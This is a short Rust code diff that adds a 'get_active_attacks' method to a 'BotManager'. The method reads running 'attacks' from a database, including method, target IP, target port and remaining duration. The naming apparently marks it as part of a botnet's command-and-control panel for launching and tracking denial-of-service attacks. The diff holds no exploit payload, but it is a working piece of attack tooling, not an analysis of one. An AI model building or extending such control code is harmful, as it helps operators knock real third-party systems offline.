@@ -275,6 +275,34 @@ impl BotManager {
             }
         }
     }
+
+    /// Get all currently active attacks from the database
+    pub async fn get_active_attacks(&self) -> Vec<(usize, String, String, u16, u64)> {
+        let rows = sqlx::query("SELECT id, method, target_ip, target_port, duration, started_at FROM attacks WHERE status = 'running'")
+            .fetch_all(&self.pool)
+            .await
+            .unwrap_or_default();
+
+        let mut active_attacks = Vec::new();
+        let now = Utc::now();
+
+        for row in rows {
+            let id: i64 = row.get("id");
+            let method: String = row.get("method");
+            let ip: String = row.get("target_ip");
+            let port: u16 = row.get("target_port");
+            let duration: i64 = row.get("duration");
+            let started_at: DateTime<Utc> = row.get("started_at");
+
+            // Check if still valid
+            let elapsed = now.signed_duration_since(started_at).num_seconds();
+            if elapsed < duration {
+                let remaining = (duration - elapsed) as u64;
+                active_attacks.push((id as usize, method, ip, port, remaining));
+            }
+        }
+        active_attacks
+    }
 }
 
 /// Generate a secure random token
